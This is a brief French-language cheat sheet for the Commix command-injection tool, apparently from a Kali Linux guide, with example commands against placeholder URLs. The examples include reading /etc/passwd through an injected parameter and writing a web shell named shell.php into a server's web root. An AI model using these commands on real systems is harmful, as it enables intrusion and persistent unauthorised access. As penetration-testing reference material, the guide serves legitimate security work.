# 💉 Commix - Command Injection Exploitation

## Description

Commix (Command Injection Exploiter) détecte et exploite les injections de commandes (OS command injection).

**Fonctionnalités :**
- Détection automatique
- Multiple techniques d'injection
- Pseudo-shell interactif
- File upload/download
- Reverse shell

---

## Installation

✅ **Déjà installé dans Kali Headless**

```bash
commix --version
```

---

## Exemples pratiques

### Scan basique

```bash
# Test GET parameter
commix -u "http://example.com/ping.php?ip=127.0.0.1"

# Test POST data
commix -u "http://example.com/ping.php" --data="ip=127.0.0.1"

# Avec cookie
commix -u "http://example.com/page.php?cmd=ls" --cookie="session=abc123"
```

### Pseudo-shell

```bash
# Une fois injection détectée
commix -u "http://example.com/ping.php?ip=INJECT_HERE"

# Commandes disponibles :
# ls, cat /etc/passwd, whoami, etc.
```

### File operations

```bash
# Read file
commix -u "URL" --file-read="/etc/passwd"

# Write file
commix -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

---

## Ressources

- [Commix GitHub](https://github.com/commixproject/commix)
